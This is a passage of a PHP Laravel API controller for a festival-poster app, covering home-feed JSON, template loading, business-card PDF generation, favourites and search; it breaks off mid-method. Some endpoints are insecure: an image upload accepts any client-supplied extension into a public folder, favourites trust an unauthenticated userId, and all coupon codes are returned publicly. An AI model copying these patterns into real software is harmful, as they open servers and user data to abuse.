<?php

namespace App\Http\Controllers\Api;

use PDF;
use App\Models\News;
use App\Models\User;
use App\Models\Entry;
use App\Models\Offer;
use App\Models\Story;
use App\Models\Video;
use App\Models\Inquiry;
use App\Models\Product;
use App\Models\Sticker;
use App\Models\Subject;
use App\Models\Business;
use App\Models\Category;
use App\Models\Language;
use App\Models\Festivals;
use App\Models\AdsSetting;
use App\Models\ApiSetting;
use App\Models\AppSetting;
use App\Models\CouponCode;
use App\Models\CustomPost;
use App\Models\CustomFrame;
use App\Models\FeaturePost;
use App\Models\PosterMaker;
use App\Models\Transaction;
use Illuminate\Support\Str;
use App\Models\BusinessCard;
use App\Models\EmailSetting;
use App\Models\OtherSetting;
use App\Models\Subscription;
use Illuminate\Http\Request;
use App\Models\BusinessFrame;
use App\Models\CategoryPost;
use App\Models\PaytmChecksum;
use App\Models\EarningHistory;
use App\Models\FestivalsPost;
use App\Models\PaymentSetting;
use App\Models\PosterCategory;
use App\Models\ReferralSystem;
use App\Models\StorageSetting;
use App\Models\CouponCodeStore;
use App\Models\CustomPostFrame;
use App\Models\ProductCategory;
use App\Models\StickerCategory;
use App\Models\WhatsAppSetting;
use App\Models\WithdrawRequest;
use App\Models\AppUpdateSetting;
use App\Models\BusinessCategory;
use App\Models\ReferralRegister;
use Illuminate\Support\Facades\DB;
use App\Models\BusinessSubCategory;
use App\Models\NotificationSetting;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;
use App\Models\UserNotification;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\Cache;

class HomeApi extends Controller
{
    public function getHomeData()
    {
        $limit = 20;

        // === OPTIMIZATION: Cache storage setting once (was called 20+ times) ===
        $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';

        $story = Story::where('status',1)->orderBy("id","desc")->take(5)->get();
        $category = Category::where('status',1)->orderBy(ApiSetting::getApiSetting("category_order_type"),ApiSetting::getApiSetting("category_order_by"))->get();
        $festival = Festivals::where('status',1)
            ->whereDate('festivals_date', '>=', date('Y-m-d'))
            ->orderBy('festivals_date', 'asc')
            ->take($limit)->get();
        $feature = FeaturePost::orderBy('id', 'desc')->take(5)->get();
        $business_category = BusinessCategory::where('status',1)->orderBy(ApiSetting::getApiSetting("business_order_type"),ApiSetting::getApiSetting("business_order_by"))->take($limit)->get();

        $story_data = [];
        $festival_data = [];
        $feature_data = [];
        $business_category_data = [];
        $category_data = [];
        $profile_business_category_data = [];

        // === OPTIMIZATION: Batch-load all videos for festivals & categories (eliminates N+1) ===
        $festivalIds = $festival->pluck('id')->toArray();
        $categoryIds = $category->pluck('id')->toArray();
        $festivalVideos = Video::where("type","festival")->whereIn("festival_id", $festivalIds)->get()->groupBy('festival_id');
        $categoryVideos = Video::where("type","category")->whereIn("category_id", $categoryIds)->get()->groupBy('category_id');
        
        foreach ($business_category as $cat) {
            $profile_business_category_data[] = array(
                "businessCategoryId" => $cat->id,
                "businessCategoryName" => $cat->name,
                "businessCategoryIcon" => ($cat->icon)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon)):"",
                "video" => false,
            );
        }
        
        foreach ($festival as $f) {
            // Use preloaded videos instead of per-loop query
            $hasVideo = isset($festivalVideos[$f->id]) && $festivalVideos[$f->id]->isNotEmpty();
            $festival_data[] = array(
                "festivalId" => $f->id,
                "festivalTitle" => $f->title,
                "festivalImage" => ($f->image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$f->image):asset('uploads/'.$f->image)):"",
                "festivalDate" => date_format(date_create(implode("", preg_split("/[-\s:,]/",$f->festivals_date))),"d M, y"),
                "festivalRawDate" => $f->festivals_date,
                "activationDate" => date_format(date_create(implode("", preg_split("/[-\s:,]/",$f->activation_date))),"d M, y"),
                "isActive" => ($f->activation_date <= date("Y-m-d",strtotime('today')))?true:false,
                "video" => $hasVideo,
            );
        }

        $business_category = \App\Models\CustomFramePurpose::where('status',1)->get();

        foreach ($business_category as $cat) {
            $business_category_data[] = array(
                "businessCategoryId" => $cat->id,
                "businessCategoryName" => $cat->name,
                "businessCategoryIcon" => ($cat->icon)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon)):"",
                "video" => false,
            );
        }

        foreach ($category as $cat) {
            // Use preloaded videos instead of per-loop query
            $hasVideo = isset($categoryVideos[$cat->id]) && $categoryVideos[$cat->id]->isNotEmpty();
            $category_data[] = array(
                "categoryId" => $cat->id,
                "categoryName" => $cat->name,
                "categoryIcon" => $isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon),
                "video" => $hasVideo,
            );
        }

        // === OPTIMIZATION: Preload all related data for features with whereIn (eliminates N+1) ===
        $featureFestivalIds = $feature->pluck('festival_id')->filter()->unique()->toArray();
        $featureCategoryIds = $feature->pluck('category_id')->filter()->unique()->toArray();
        $featureCustomIds = $feature->pluck('custom_id')->filter()->unique()->toArray();
        $preloadedFestivals = Festivals::whereIn('id', $featureFestivalIds)->get()->keyBy('id');
        $preloadedCategories = Category::whereIn('id', $featureCategoryIds)->get()->keyBy('id');
        $preloadedCustoms = CustomPost::whereIn('id', $featureCustomIds)->get()->keyBy('id');

        foreach ($feature as $f_data) {
            $festival = $preloadedFestivals->get($f_data->festival_id);
            $category = $preloadedCategories->get($f_data->category_id);
            $custom = $preloadedCustoms->get($f_data->custom_id);
            $f_id = "";
            $f_name = "";
            $f_image = "";
            $video = "";

            if(!empty($festival))
            {
                $hasVideo = isset($festivalVideos[$festival->id]) && $festivalVideos[$festival->id]->isNotEmpty();
                $f_id = $festival->id;
                $f_name = $festival->title;
                $f_image = $festival->image;
                $video = $hasVideo;
            }

            if(!empty($category))
            {
                $hasVideo = isset($categoryVideos[$category->id]) && $categoryVideos[$category->id]->isNotEmpty();
                $f_id = $category->id;
                $f_name = $category->name;
                $f_image = $category->icon;
                $video = $hasVideo;
            }

            if(!empty($custom))
            {
                $video = false;
                $f_id = $custom->id;
                $f_name = $custom->name;
                $f_image = $custom->icon;
            }

            $festival_post = FestivalsPost::where("festivals_id",$f_data->festival_id)->where('status',1)->with(['festivals','language'])->inRandomOrder()->take($limit)->get();
            $category_post = CategoryPost::where("category_id",$f_data->category_id)->where('status',1)->with(['category','language'])->inRandomOrder()->take($limit)->get();
            $custom_frame = CustomPostFrame::where("custom_post_id",$f_data->custom_id)->where('status',1)->inRandomOrder()->take($limit)->get();
            $frame_data = [];

            if(!$festival_post->isEmpty())
            {
                foreach ($festival_post as $f) 
                {
                    $frame_data[] = array(
                        "postId" => $f->festivals->title."".$f->id,
                        "id" => $f->festivals_id,
                        "type" => "festival",
                        "language" => $f->language->title,
                        "image" => ($f->frame_image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$f->frame_image):asset('uploads/'.$f->frame_image)):"",
                        "is_paid" => ($f->paid==1)?true:false,
                        "height" => $f->height,
                        "width" => $f->width,
                        "image_type" => $f->image_type,
                        "aspect_ratio" => $f->aspect_ratio,
                    );
                }
            }

            if(!$category_post->isEmpty())
            {
                foreach ($category_post as $c) 
                {
                    $frame_data[] = array(
                        "postId" => $c->category->name."".$c->id,
                        "id" => $c->category_id,
                        "type" => "category",
                        "language" => $c->language->title,
                        "image" => ($c->frame_image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"",
                        "is_paid" => ($c->paid==1)?true:false,
                        "height" => $c->height,
                        "width" => $c->width,
                        "image_type" => $c->image_type,
                        "aspect_ratio" => $c->aspect_ratio,
                    );
                }
            }

            if(!$custom_frame->isEmpty())
            {
                foreach ($custom_frame as $cc) 
                {
                    if($cc->zip_name)
                    {
                        // === OPTIMIZATION: Cache template JSON per zip_name ===
                        $zip_name_key = $cc->zip_name;
                        $json_data = Cache::remember("template_json:{$zip_name_key}", 3600, function () use ($cc, $isDigitalOcean) {
                            if($isDigitalOcean)
                            {
                                $file = Storage::disk('spaces')->allFiles('uploads/template/'.$cc->zip_name.'/json/');
                                return file_get_contents(Storage::disk('spaces')->url($file[0]));
                            }
                            else
                            {
                                $file = scandir('./uploads/template/'.$cc->zip_name.'/json/', 1);
                                return file_get_contents(asset('uploads/template/'.$cc->zip_name.'/json/'.$file[0]));
                            }
                        });
                    }

                    $frame_data[] = array(
                        "postId" => $cc->custom_post->name."".$cc->id,
                        "id" => $cc->custom_post_id,
                        "type" => "custom ".$cc->custom_frame_type,
                        "is_template" => true,
                        "language" => $cc->language->title,
                        "image" => ($cc->frame_image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cc->frame_image):asset('uploads/'.$cc->frame_image)):"",
                        "is_paid" => ($cc->paid==1)?true:false,
                        "height" => $cc->height,
                        "width" => $cc->width,
                        "image_type" => $cc->image_type,
                        "aspect_ratio" => $cc->aspect_ratio,
                        "name" => ($cc->zip_name)?$cc->zip_name:"",
                        "json" => ($cc->zip_name)?$json_data:"",
                    );
                }
            }

            $feature_data[] = array(
                "featureId" => $f_data->id,
                "id" => $f_id,
                "title" => $f_name,
                "image" => ($f_image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$f_image):asset('uploads/'.$f_image)):"",
                "type" => $f_data->type,
                "video" => (!empty($video))?true:false,
                "post" => $frame_data,
            );
        }

        // === OPTIMIZATION: Preload all related data for stories (eliminates 5N queries) ===
        $storyFestivalIds = $story->pluck('festival_id')->filter()->unique()->toArray();
        $storyCategoryIds = $story->pluck('category_id')->filter()->unique()->toArray();
        $storySubIds = $story->pluck('subscription_id')->filter()->unique()->toArray();
        $storyCustomIds = $story->pluck('custom_category_id')->filter()->unique()->toArray();
        $storyFestivals = Festivals::whereIn('id', $storyFestivalIds)->get()->keyBy('id');
        $storyCategories = Category::whereIn('id', $storyCategoryIds)->get()->keyBy('id');
        $storySubscriptions = Subscription::whereIn('id', $storySubIds)->get()->keyBy('id');
        $storyCustoms = CustomPost::whereIn('id', $storyCustomIds)->get()->keyBy('id');

        foreach ($story as $s) {
            $festival = $storyFestivals->get($s->festival_id);
            $category = $storyCategories->get($s->category_id);
            $subscription = $storySubscriptions->get($s->subscription_id);
            $custom = $storyCustoms->get($s->custom_category_id);
            $s_id = "";
            $s_name = "";
            $video = [];

            if(!empty($festival))
            {
                $hasVideo = isset($festivalVideos[$festival->id]) && $festivalVideos[$festival->id]->isNotEmpty();
                $s_id = $festival->id;
                $s_name = $festival->title;
                $video = $hasVideo ? [1] : [];
            }

            if(!empty($custom))
            {
                $s_id = $custom->id;
                $s_name = $custom->name;
            }

            if(!empty($category))
            {
                $hasVideo = isset($categoryVideos[$category->id]) && $categoryVideos[$category->id]->isNotEmpty();
                $s_id = $category->id;
                $s_name = $category->name;
                $video = $hasVideo ? [1] : [];
            }

            if(!empty($subscription))
            {
                $s_id = $subscription->id;
                $s_name = $subscription->plan_name;
            }

            $story_data[] = array(
                "storyId" => $s->id,
                "storyType" => $s->story_type,
                "image" => $isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$s->image):asset('uploads/'.$s->image),
                "id" => $s_id,
                "name" => ($s_name)?$s_name: $s->external_link_title,
                "externalLink"=> $s->external_link,
                "video" => (count($video) == 0)?false:true,
            );
        }
        
        return response()->json([
            "Story" => $story_data,
            "Festival" => $festival_data,
            "Feature" => $feature_data,
            "BusinessCategory" => $business_category_data,
            "Category" => $category_data,
            "ProfileBusinessCategory" => $profile_business_category_data,
        ], 200);
    }

    public function customPost()
    {
        $customCategory = \App\Models\CustomFramePurpose::where('status',1)->get();
        $custom_category = [];
        $data = [];
        $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';

        foreach ($customCategory as $c)
        {
            $custom_category[] = array(
                "customCategoryId" => $c->id,
                "customCategoryName" => $c->name,
                "customCategoryIcon" => ($c->icon)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$c->icon):asset('uploads/'.$c->icon)):"",
            );
        }

        foreach ($customCategory as $c)
        {
            $custom_frame = \App\Models\BusinessCustomFrame::where("custom_frame_purpose_id",$c->id)->where("status", 1)->inRandomOrder()->get();
            $posts = [];

            foreach ($custom_frame as $frame) 
            {
                $zip_name = pathinfo($frame->zip_file_path, PATHINFO_FILENAME);
                $json_data = "";

                if($zip_name)
                {
                    // === OPTIMIZATION: Cache template JSON per zip_name ===
                    $json_data = Cache::remember("template_json:{$zip_name}", 3600, function () use ($zip_name, $isDigitalOcean) {
                        if($isDigitalOcean)
                        {
                            $file = Storage::disk('spaces')->allFiles('uploads/template/'.$zip_name.'/json/');
                            if(!empty($file)) {
                                return file_get_contents(Storage::disk('spaces')->url($file[0]));
                            }
                        }
                        else
                        {
                            if(is_dir('./uploads/template/'.$zip_name.'/json/')) {
                                $file = scandir('./uploads/template/'.$zip_name.'/json/', 1);
                                if(isset($file[0]) && $file[0] != '.' && $file[0] != '..') {
                                    return file_get_contents(public_path('uploads/template/'.$zip_name.'/json/'.$file[0]));
                                }
                            }
                        }
                        return "";
                    });
                }

                $preview_img = "";
                if($isDigitalOcean) {
                    // For DigitalOcean, we assume it's preview.jpg for now, or fallback to similar logic if needed.
                    $preview_img = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
                } else {
                    $dir = public_path('uploads/template/'.$zip_name.'/');
                    if (is_dir($dir)) {
                        if (file_exists($dir.'preview.jpg')) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/preview.jpg');
                        } elseif (file_exists($dir.'preview.png')) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/preview.png');
                        } else {
                            $files = glob($dir . '*.{jpg,jpeg,png}', GLOB_BRACE);
                            if (!empty($files)) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/'.basename($files[0]));
                            }
                        }
                    }
                }

                $token = request()->bearerToken();
                $sanctumId = null;
                try { $sanctumId = auth('sanctum')->id(); } catch (\Exception $e) {}
                $userId = request('userId') ?? request('user_id') ?? request()->header('user-id') ?? $sanctumId;
                
                // If it's a manual api_token, let's try finding the user
                if (!$userId && $token) {
                    $userByToken = \App\Models\User::where('api_token', $token)->first();
                    if ($userByToken) {
                        $userId = $userByToken->id;
                    }
                }

                \Illuminate\Support\Facades\Log::info("DEBUG API customPost: userId resolved: " . ($userId ?? 'NULL') . ", token present: " . ($token ? 'YES' : 'NO') . ", query: " . json_encode(request()->query()));
                
                if ($userId && !empty($json_data)) {
                    $aiContent = \App\Models\UserCustomFrameContent::where('user_id', $userId)
                        ->where('business_custom_frame_id', $frame->id)
                        ->first();
                        
                    if ($aiContent) {
                        \Illuminate\Support\Facades\Log::info("DEBUG API customPost: AI Content Found for Frame ID: " . $frame->id);
                        if (!empty($aiContent->generated_content)) {
                            $parsedJson = json_decode($json_data, true);
                            if ($parsedJson && isset($parsedJson['layers'])) {
                                $replacedCount = 0;
                                foreach ($parsedJson['layers'] as &$layer) {
                                    if (isset($layer['type']) && $layer['type'] === 'text' && isset($layer['name'])) {
                                        if (isset($aiContent->generated_content[$layer['name']])) {
                                            $layer['text'] = $aiContent->generated_content[$layer['name']];
                                            $replacedCount++;
                                        }
                                    }
                                }
                                \Illuminate\Support\Facades\Log::info("DEBUG API customPost: Replaced $replacedCount text layers.");
                                $json_data = json_encode($parsedJson);
                            }
                        }
                    }
                }

                $posts[] = array(
                    "postId" => $c->name."".$frame->id,
                    "id" => $frame->id,
                    "type" => "business_custom_frame",
                    "is_template" => true,
                    "language" => "All",
                    "image" => $preview_img,
                    "is_paid" => false,
                    "height" => $frame->height ?? 1080,
                    "width" => $frame->width ?? 1080,
                    "image_type" => $frame->imageType->name ?? "square",
                    "aspect_ratio" => $frame->aspect_ratio ?? "1:1",
                    "name" => ($zip_name)?$zip_name:"",
                    "json" => ($zip_name)?$json_data:"",
                    "created_at" => $frame->created_at ? $frame->created_at->toISOString() : null,
                );
            }

                $data[] = array(
                    "customCategoryId" => $c->id,
                    "customCategoryName" => $c->name,
                    "customCategoryIcon" => ($c->icon)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$c->icon):asset('uploads/'.$c->icon)):"",
                    "posts" => $posts
                );
            }

            // Build recent posts list (top 10 most recently added templates)
            $allPosts = collect($data)->pluck('posts')->flatten(1)
                ->sortByDesc('created_at')->take(10)->values()->all();

            \Illuminate\Support\Facades\Log::info("CustomPost API Debug: ", [
                'categories_count' => count($custom_category),
                'data_count' => count($data),
                'recent_count' => count($allPosts),
            ]);

            return response()->json([
                "category" => $custom_category,
                "data" => $data,
                "recent_posts" => $allPosts,
            ], 200);
    }

    public function getCategory()
    {
        $category = Category::where('status',1)->orderBy(ApiSetting::getApiSetting("category_order_type"),ApiSetting::getApiSetting("category_order_by"))->get();

        if(!$category->isEmpty())
        {
            $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';
            // Batch-load all video checks in one query
            $categoryIds = $category->pluck('id')->toArray();
            $videoCategoryIds = Video::where("type","category")->whereIn("category_id", $categoryIds)->distinct()->pluck('category_id')->toArray();

            foreach ($category as $cat) {
                $data[] = array(
                    "categoryId" => $cat->id,
                    "categoryName" => $cat->name,
                    "categoryIcon" => $isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon),
                    "video" => in_array($cat->id, $videoCategoryIds),
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function profile_card_image_upload(Request $request)
    {
        if(StorageSetting::getStorageSetting("storage") == "DigitalOcean")
        {
            $image = $request->file('profile_image');
            $fileName = Str::uuid().'.'.$image->getClientOriginalExtension();
    
            $path = Storage::disk('spaces')->put('uploads/'.$fileName, file_get_contents($image),'public');
        }
        else
        {
            $destinationPath = './uploads';
            $extension = $request->file("profile_image")->getClientOriginalExtension();
            $fileName = Str::uuid() . '.' . $extension;
            $request->file("profile_image")->move($destinationPath, $fileName);
        }

        if(isset($fileName))
        {
            return response()->json([
                'url' => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$fileName):asset('uploads/'.$fileName),
            ], 200);
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "Image Upload Failed!",
            ], 404);
        }
    }

    public function business_card_list()
    {
        $card = BusinessCard::where('status',1)->get();
        foreach($card as $c)
        {
            $data[] = array(
                "cardId" => $c->id,
                "cardName" => $c->name,
                "cardImage" => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->image):asset('uploads/'.$c->image),
            );
        }
        return $data;
    }

    public function profile_card(Request $request)
    {
        $data = [
            'image' => ($request->image)?$request->image:"",
            'name'    => ($request->name)?$request->name:"",
            'designation'    => ($request->designation)?$request->designation:"",
            'email'    => ($request->email)?$request->email:"",
            'address'    => ($request->address)?$request->address:"",
            'phone'    => ($request->phone)?$request->phone:"",
            'website'    => ($request->website)?$request->website:"",
            'twitter'    => ($request->twitter)?$request->twitter:"",
            'facebook'    => ($request->facebook)?$request->facebook:"",
            'whatsapp'    => ($request->whatsapp)?$request->whatsapp:"",
            'linkedin'    => ($request->linkedin)?$request->linkedin:"",
            'about_us' => ($request->about_us)?$request->about_us:"",
            'comapany_name' => ($request->comapany_name)?$request->comapany_name:"",
            'instagram' => ($request->instagram)?$request->instagram:"",
            'youtube' => ($request->youtube)?$request->youtube:"",
        ];

        $pdf_file_name = $request->template."_".str_replace(" ","_",strtolower($request->name));
        $height = round(strlen($data['about_us'])/60);
        $address_line = ceil(strlen($data['address'])/60);
        $count = ($address_line == 1)?0:$address_line*8;

        if($request->template == "vCard1")
        {
            $customPaper = array(35,-50,360+$height*17+$count,375);
        }
        elseif($request->template == "vCard2")
        {
            $customPaper = array(0,0,398+($height*18)+(($address_line == 1)?0:$address_line*15),375);
        }
        elseif($request->template == "vCard3")
        {
            $customPaper = array(0,0,650+(ceil(strlen($data['about_us'])/65))*18+(($address_line == 1)?0:$address_line*4),375);
        }
        elseif($request->template == "vCard4")
        {
            $customPaper = array(35,-50,660,439);
        }
        elseif($request->template == "vCard5")
        {
            $customPaper = array(0,0,520+$height*17+$count,375);
        }
        elseif($request->template == "vCard6")
        {
            $customPaper = array(0,0,505+$height*17+$count,375);
        }
        elseif($request->template == "vCard7")
        {
            $customPaper = array(0,0,415+$height*17+$count,375);
        }
        elseif($request->template == "vCard8")
        {
            $customPaper = array(0,0,550+$height*17,375);
        }
        elseif($request->template == "vCard9")
        {
            $customPaper = array(0,0,575+$height*17+(($address_line == 1)?0:$address_line*3),375);
        }
        elseif($request->template == "vCard10")
        {
            $customPaper = array(0,0,550+$height*17,375);
        }

        if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
        {
            $all = Storage::disk('spaces')->allFiles('uploads/pdf/');
            foreach($all as $a)
            {
                $filelastmodified = Storage::disk('spaces')->lastModified($a);
                if((time() - $filelastmodified) > 24*3600)
                {
                    Storage::disk('spaces')->delete($a);
                }
            }
        }
        else
        {
            $path = './uploads/pdf/';

            if ($handle = opendir($path)) {
                while (false !== ($file = readdir($handle))) { 
                    if ($file != "." && $file != "..") {
                        $filelastmodified = filemtime($path . $file);
                        //24 hours in a day * 3600 seconds per hour
                        if((time() - $filelastmodified) > 24*3600)
                        {
                            unlink($path . $file);
                        }
                    }

                }
                closedir($handle); 
            }
        }

        $pdf = PDF::loadView('template.'.$request->template,$data)->setPaper($customPaper, 'landscape');
        $random = Str::random(10);

        if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
        {
            Storage::disk('spaces')->delete('/uploads/pdf/'.$random.'.pdf');
        }
        else
        {
            if (File::exists('./uploads/pdf/'.$random.'.pdf')) {
                File::delete('./uploads/pdf/'.$random.'.pdf');
            }
        }
        
        if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
        {
            Storage::disk('spaces')->put("uploads/pdf/".$random.".pdf", $pdf->output(),'public');
        }
        else
        {
            file_put_contents("./uploads/pdf/".$random.".pdf", $pdf->output());
        }

        return response()->json([
            'url' => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/pdf/'.$random.'.pdf'):asset('uploads/pdf/'.$random.'.pdf'),
        ], 200);
    }

    public function getPromocodes(Request $request)
    {
        return response()->json([
            'promocodes' => \App\Models\CouponCode::where('status', 1)->get()
        ], 200);
    }

    public function userFavoriteFrame(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required',
            'frameId' => 'required',
        ]);

        if ($validation->fails()) {
            return response()->json(['success' => false, 'message' => 'Missing required fields'], 400);
        }

        $userId = $request->get('userId');
        $frameId = $request->get('frameId');

        $existing = \App\Models\UserFavoriteFrame::where('user_id', $userId)->where('frame_identifier', $frameId)->first();

        if ($existing) {
            $existing->delete();
            return response()->json(['success' => true, 'action' => 'removed']);
        } else {
            \App\Models\UserFavoriteFrame::create([
                'user_id' => $userId,
                'frame_identifier' => $frameId
            ]);
            return response()->json(['success' => true, 'action' => 'added']);
        }
    }

    public function userFavorites(Request $request)
    {
        $userId = $request->get('userId');
        if (!$userId) {
            return response()->json(['success' => false, 'message' => 'User ID required'], 400);
        }
        $favorites = \App\Models\UserFavoriteFrame::where('user_id', $userId)->pluck('frame_identifier');
        return response()->json(['success' => true, 'data' => $favorites]);
    }

    public function getStory()
    {
        $story = Story::where('status',1)->orderBy("id","desc")->get();
        
        if(!$story->isEmpty())
        {
            $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';

            // Preload all related data in batch (eliminates 5N queries)
            $festivalIds = $story->pluck('festival_id')->filter()->unique()->toArray();
            $categoryIds = $story->pluck('category_id')->filter()->unique()->toArray();
            $subIds = $story->pluck('subscription_id')->filter()->unique()->toArray();
            $customIds = $story->pluck('custom_category_id')->filter()->unique()->toArray();

            $festivals = Festivals::whereIn('id', $festivalIds)->get()->keyBy('id');
            $categories = Category::whereIn('id', $categoryIds)->get()->keyBy('id');
            $subscriptions = Subscription::whereIn('id', $subIds)->get()->keyBy('id');
            $customs = CustomPost::whereIn('id', $customIds)->get()->keyBy('id');

            foreach ($story as $s) {
                $festival = $festivals->get($s->festival_id);
                $category = $categories->get($s->category_id);
                $subscription = $subscriptions->get($s->subscription_id);
                $custom = $customs->get($s->custom_category_id);

                $id = "";
                $name = "";

                if(!empty($festival))
                {
                    $id = $festival->id;
                    $name = $festival->title;
                }

                if(!empty($custom))
                {
                    $id = $custom->id;
                    $name = $custom->name;
                }

                if(!empty($category))
                {
                    $id = $category->id;
                    $name = $category->name;
                }

                if(!empty($subscription))
                {
                    $id = $subscription->id;
                    $name = $subscription->plan_name;
                }

                $data[] = array(
                    "storyId" => $s->id,
                    "storyType" => $s->story_type,
                    "image" => $isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$s->image):asset('uploads/'.$s->image),
                    "id" => $id,
                    "name" => ($name)?$name: $s->external_link_title,
                    "externalLink"=> $s->external_link,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getFestival(Request $request)
    {
        $query = Festivals::where('status',1)
                    ->where('activation_date',"<=",date("Y-m-d",strtotime('today')));
        
        if ($request->has('date') && !empty($request->date)) {
            $query->whereDate('festivals_date', date('Y-m-d', strtotime($request->date)));
        } else {
            $query->whereDate('festivals_date', ">=", date("Y-m-d",strtotime('today')));
        }

        $festival = $query->orderBy(ApiSetting::getApiSetting("festival_order_type"),ApiSetting::getApiSetting("festival_order_by"))->get();
       
        if(!$festival->isEmpty())
        {
            $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';
            // Batch-load all video checks in one query
            $festivalIds = $festival->pluck('id')->toArray();
            $videoFestivalIds = Video::where("type","festival")->whereIn("festival_id", $festivalIds)->distinct()->pluck('festival_id')->toArray();

            $data = [];
            foreach ($festival as $f) {
                $data[] = array(
                    "festivalId" => $f->id,
                    "festivalTitle" => $f->title,
                    "festivalImage" => ($f->image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$f->image):asset('uploads/'.$f->image)):"",
                    "festivalDate" => date_format(date_create(implode("", preg_split("/[-\s:,]/",$f->festivals_date))),"d M, y"),
                    "activationDate" => date_format(date_create(implode("", preg_split("/[-\s:,]/",$f->activation_date))),"d M, y"),
                    "isActive" => ($f->activation_date <= date("Y-m-d",strtotime('today')))?true:false,
                    "video" => in_array($f->id, $videoFestivalIds),
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getNews()
    {
        $news = News::orderBy(ApiSetting::getApiSetting("news_order_type"),ApiSetting::getApiSetting("news_order_by"))->get();
    
        if(!$news->isEmpty())
        {
            foreach ($news as $n) {
                $data[] = array(
                    "id" => $n->id,
                    "title" => $n->title,
                    "description" => $n->description,
                    "image" => ($n->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$n->image):asset('uploads/'.$n->image)):"",
                    "date" => date('d M, y',strtotime($n->date))
                );
            }
            return $data;
        }
        else
        {
            return $data = array();
        }
    }

    public function personal()
    {
        $data = [];
        $festival = Festivals::whereBetween('festivals_date',[date('Y-m-d',strtotime('today')),date('Y-m-d',strtotime('+1 days'))])->where('status',1)->get();
        $feature_festival = FeaturePost::where('type',"festival")->get();
        $feature_category = FeaturePost::where('type',"category")->get();

        foreach ($festival as $f) {
            $data[] = array(
                "id" => $f->id,
                "name" => $f->title,
                "type" => "festival"
            );
        }

        foreach ($feature_festival as $ff) {
            $festival = Festivals::find($ff->festival_id);
            if($festival && $festival->festivals_date > date("Y-m-d",strtotime('+1 days')))
            {
                $data[] = array(
                    "id" => $festival->id,
                    "name" => $festival->title,
                    "type" => "festival"
                );
            }
        }

        foreach ($feature_category as $fc) {
            $category = Category::find($fc->category_id);
            $data[] = array(
                "id" => $category->id,
                "name" => $category->name,
                "type" => "category"
            );
        }

        return $data;
    }

    public function search(Request $request)
    {
        $data = [];
        $festival = Festivals::where("title",'Like', '%'.$request->term.'%')->where('status',1)->get();
        $category = Category::where("name",'Like', '%'.$request->term.'%')->where('status',1)->get();
        $custom_post = CustomPost::where("name",'Like', '%'.$request->term.'%')->where('status',1)->get();
        $business_category = BusinessCategory::where("name",'Like', '%'.$request->term.'%')->where('status',1)->get();

        foreach($festival as $fest) 
        {
            $festivalPost = FestivalsPost::where("festivals_id",$fest->id)->where('status',1)->inRandomOrder()->get();
                    
            foreach ($festivalPost as $f) 
            {
                $data[] = array(
                    "postId" => $f->festivals->title."".$f->id,
                    "id" => $f->festivals_id,
                    "type" => "festival",
                    "language" => $f->language->title,
                    "image" => ($f->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$f->frame_image):asset('uploads/'.$f->frame_image)):"",
                    "is_paid" => ($f->paid==1)?true:false,
                    "height" => $f->height,
                    "width" => $f->width,
                    "image_type" => $f->image_type,
                    "aspect_ratio" => $f->aspect_ratio,
                );
            }
        }

        foreach($category as $cat) 
        {
            $categoryPost = CategoryPost::where("category_id",$cat->id)->where('status',1)->inRandomOrder()->get();
                    
            foreach ($categoryPost as $c) 
            {
                $data[] = array(
                    "postId" => $c->category->name."".$c->id,
                    "id" => $c->category_id,
                    "type" => "category",
                    "language" => $c->language->title,
                    "image" => ($c->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"",
                    "is_paid" => ($c->paid==1)?true:false,
